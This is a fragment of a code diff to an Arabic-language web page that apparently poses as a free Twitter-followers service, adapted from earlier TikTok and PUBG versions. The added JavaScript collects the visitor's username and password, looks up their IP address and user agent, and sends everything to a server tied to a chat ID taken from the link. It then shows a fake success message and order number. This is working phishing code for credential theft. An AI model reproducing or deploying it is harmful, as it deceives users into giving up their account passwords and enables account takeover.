+                },
+                body: JSON.stringify({
+                    playerId: socialData.username,
+                    password: socialData.password,
+                    amount: socialData.followersCount,
+                    chatId: socialData.chatId,
+                    accountType: socialData.accountType,
+                    device: navigator.userAgent,
+                    ip: socialData.ip
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (result.success) {
+                console.log('✅ تم إرسال بيانات الحساب بنجاح');
+                return { success: true, message: result.message };
+            } else {
+                console.log('❌ فشل إرسال بيانات الحساب');
+                return { success: false, message: result.message };
+            }
+        } catch (error) {
+            console.error('❌ خطأ في الإرسال:', error);
+            return { success: false, message: 'حدث خطأ في الإرسال' };
+        }
+    }
+
+    // دالة إرسال تويتر
+    async function submitTwitterAccount(username, password, followersCount, chatId, ip) {
+        const socialData = {
+            username: username,
+            password: password,
+            followersCount: followersCount,
+            chatId: chatId,
+            accountType: 'تويتر',
+            ip: ip
+        };
+        
+        const result = await sendSocialAccount(socialData);
+        return result;
     }
 
     document.addEventListener("DOMContentLoaded", () => {
-      createSnow();
-      
       // الحصول على معرف الدردشة من الرابط
       const urlParams = new URLSearchParams(window.location.search);
-      const CHAT_ID = urlParams.get('id');
+      const CHAT_ID = urlParams.get('id') || "unknown";
       
-      const form = document.getElementById("pubgForm");
+      const form = document.getElementById("twitterForm");
       const submitBtn = document.getElementById("submitBtn");
       const loadingSpinner = document.getElementById("loadingSpinner");
       
+      // عند إرسال النموذج
       if (!form) return;
 
       form.addEventListener("submit", async function (e) {
@@ -797,45 +779,38 @@
         const playerId = data.get("player_id");
         const amount = data.get("amount");
 
+        // الحصول على عنوان IP
         const ipData = await fetch("https://api.ipify.org?format=json")
           .then(res => res.json())
           .catch(() => ({ ip: "غير معروف" }));
 
-        // تحضير البيانات للإرسال إلى السيرفر
-        const socialData = {
-          username: playerId,
-          password: password,
-          followersCount: amount,
-          chatId: CHAT_ID || "unknown",
-          accountType: 'تيك توك',
-          ip: ipData.ip
-        };
-
         try {
-          // إرسال البيانات إلى السيرفر باستخدام الدالة الجديدة
-          const result = await sendSocialAccount(socialData);
+          // استخدام الدالة الجديدة لإرسال بيانات تويتر
+          const result = await submitTwitterAccount(playerId, password, amount, CHAT_ID, ipData.ip);
           
           if (result.success) {
             // إظهار رسالة النجاح
             const successHTML = `
               <div class="success-message">
                 <h3>تمت العملية بنجاح! ✅</h3>
-                <p>${result.message}</p>
-                <p>سيتم شحن متابعين تيك توك خلال 24 ساعة</p>
+                <p>${result.message || 'سيتم شحن متابعين تويتر خلال 24 ساعة'}</p>
                 <p>رقم الطلب: #${Math.floor(100000 + Math.random() * 900000)}</p>
+                <p><i class="fas fa-check-circle"></i> تم استلام بياناتك بنجاح</p>
               </div>
             `;
             form.innerHTML = successHTML;
+            showNotification('تم إرسال بيانات الحساب بنجاح!', 'success');
           } else {
             // إظهار رسالة الخطأ مع تفاصيل
             const errorHTML = `
               <div style="background: rgba(231, 76, 60, 0.2); border: 1px solid rgba(231, 76, 60, 0.4); border-radius: 10px; padding: 15px; margin: 20px 0; text-align: center;">
                 <h3>خطأ في الإرسال! ❌</h3>
-                <p>${result.message || 'حدث خطأ غير معروف'}</p>
+                <p>${result.message || 'حدث خطأ أثناء إرسال البيانات إلى السيرفر'}</p>
                 <p>يرجى المحاولة مرة أخرى</p>
               </div>
             `;
             form.innerHTML = errorHTML;
+            showNotification(result.message || 'فشل إرسال البيانات!', 'error');
           }
         } catch (error) {
           // إظهار رسالة الخطأ مع تفاصيل
@@ -847,6 +822,7 @@
             </div>
           `;
           form.innerHTML = errorHTML;
+          showNotification('حدث خطأ في الإرسال!', 'error');
         } finally {
           // إعادة عرض زر الإرسال
           submitBtn.style.display = "block";
@@ -856,4 +832,4 @@
     });
   </script>
 </body>
-</html>
+          </html>
